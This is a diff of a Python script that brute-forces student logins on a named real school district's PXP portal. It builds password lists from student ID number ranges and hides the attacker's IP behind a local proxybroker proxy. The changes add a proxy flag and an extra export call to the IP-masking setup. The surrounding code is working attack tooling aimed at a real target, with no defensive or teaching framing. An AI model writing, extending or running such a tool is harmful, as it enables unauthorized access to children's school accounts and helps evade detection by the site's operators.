@@ -23,9 +23,7 @@ passlist = []
 URL = "https://qc.apscc.org/Login_Student_PXP.aspx?regenerateSessionId=True"
 check = Fore.GREEN + "[*]" + Fore.WHITE + " "
 error = Fore.GREEN + "[*]" + Fore.WHITE + " "
-
 ID_RANGE = ["219","220","221","222","223"]
-
 parser = argparse.ArgumentParser(description='specify an username.',)
 parser.add_argument('--username',help='ex: --username username',required=True)
 parser.add_argument('--proxy', help='specify if you want to mask your ip with proxys (linux only).', action='store_true')
@@ -53,7 +51,7 @@ def realpasswordgen():
         passlist.append(IDNUMBER)
 
 def server():
-	os.system("proxybroker serve --host 127.0.0.1 --port 8888 --types HTTP HTTPS --lvl High")
+	os.system("proxybroker serve --host 127.0.0.1 --port 8888 --types HTTP HTTPS --lvl High -s")
 
 def proxy_setup():
 	print(check+"Staring PROXY thread to localhost")
@@ -61,6 +59,7 @@ def proxy_setup():
 	th.start()
 	t.sleep(3)
 	print(check+"Rerouting HTTP and HTTPS traffic to localhost.")
+	os.system("export use_proxy=yes")
 	os.system("export http_proxy=http://127.0.0.1:8888")
 	os.system("export https_proxy=http://127.0.0.1:8888")
 	os.system("export ftp_proxy=http://127.0.0.1:8888")
